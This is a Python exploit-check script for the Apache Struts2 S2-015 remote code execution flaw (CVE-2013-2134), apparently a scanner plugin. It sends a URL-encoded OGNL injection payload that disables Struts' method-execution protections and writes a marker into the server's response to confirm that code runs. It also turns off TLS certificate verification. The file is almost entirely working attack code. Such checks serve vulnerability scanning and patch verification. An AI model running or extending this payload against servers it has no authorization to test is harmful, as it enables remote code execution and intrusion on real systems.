import requests
from urllib.parse import urlparse
requests.packages.urllib3.disable_warnings()

name = 'Apache Struts2 S2-015 远程代码执行漏洞（CVE-2013-2134）'


def run(url):
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0',
    }
    try:
        payload = '''%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23writer%3D%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2C%23writer.println%28%27Tre0a498347a5a75a7ue%27%29%2C%23writer.close%28%29%7D.action'''
        response = requests.get(url + payload, headers=headers, timeout=15, verify=False)
        if 'Tre0a498347a5a75a7ue' in response.text and 'println' not in response.text:
            return ['True', name, url]
        else:
            host = urlparse(url)
            url = f"{host.scheme}://{host.netloc}"
            try:
                vulurl = url + '/'
                payload = '''%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23writer%3D%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2C%23writer.println%28%27Tre0a498347a5a75a7ue%27%29%2C%23writer.close%28%29%7D.action'''
                response = requests.get(vulurl + payload, headers=headers, timeout=15, verify=False)
                if 'Tre0a498347a5a75a7ue' in response.text and 'println' not in response.text:
                    return ['True', name, vulurl]
                else:
                    return ['False', name]
            except Exception as e:
                return ['False', name]
    except Exception as e:
        return ['False', name]

if __name__ == '__main__':
    url = ''
    print(run(url))
